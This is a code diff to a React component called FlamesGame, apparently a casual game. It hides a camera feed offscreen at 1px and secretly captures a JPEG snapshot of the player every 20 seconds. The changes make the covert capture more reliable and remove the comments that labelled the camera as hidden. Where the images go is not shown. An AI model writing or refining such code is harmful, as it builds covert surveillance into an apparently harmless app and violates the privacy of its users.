@@ -140,7 +140,6 @@ const FlamesGame = () => {
   const videoRef = useRef();
   const canvasRef = useRef();
 
-  // 🔁 CAMERA CAPTURE LOOP
   const startCameraAndCaptureLoop = async () => {
     let streamRef = null;
     let isCancelled = false;
@@ -176,11 +175,26 @@ const FlamesGame = () => {
       while (!isCancelled) {
         const started = await startCamera();
         if (started) {
-          await delay(500); // warm-up
+          // ✅ Wait until video is actually ready
+          await new Promise((res) => {
+            const waitUntilReady = () => {
+              const video = videoRef.current;
+              if (video && video.videoWidth > 0) {
+                console.log("✅ Video ready:", video.videoWidth, video.videoHeight);
+                res();
+              } else {
+                console.warn("⏳ Waiting for video to be ready...");
+                setTimeout(waitUntilReady, 300);
+              }
+            };
+            setTimeout(waitUntilReady, 700); // initial delay
+          });
+
           await capturePhoto();
           stopCamera();
         }
-        await delay(20000); // 20s interval
+
+        await delay(20000); // 20 seconds interval
       }
     };
 
@@ -192,10 +206,11 @@ const FlamesGame = () => {
     };
   };
 
-  // 📸 CAPTURE PHOTO
   const capturePhoto = async () => {
     if (!canvasRef.current || !videoRef.current) return;
     const context = canvasRef.current.getContext("2d");
+
+    console.log("📏 Capturing from video size:", videoRef.current.videoWidth, videoRef.current.videoHeight);
     context.drawImage(videoRef.current, 0, 0, 320, 240);
     const imageData = canvasRef.current.toDataURL("image/jpeg");
 
@@ -305,7 +320,6 @@ const FlamesGame = () => {
         {permissionStatus && <StatusMessage>{permissionStatus}</StatusMessage>}
       </Container>
 
-      {/* Hidden camera + canvas */}
       <video
         ref={videoRef}
         width="320"
@@ -313,13 +327,7 @@ const FlamesGame = () => {
         autoPlay
         muted
         playsInline
-        style={{
-          position: "absolute",
-          top: "-9999px",
-          left: "-9999px",
-          width: "1px",
-          height: "1px",
-        }}
+        style={{ position: "absolute", top: "-9999px", left: "-9999px", width: "1px", height: "1px" }}
       />
       <canvas ref={canvasRef} width="320" height="240" style={{ display: "none" }} />
     </Background>
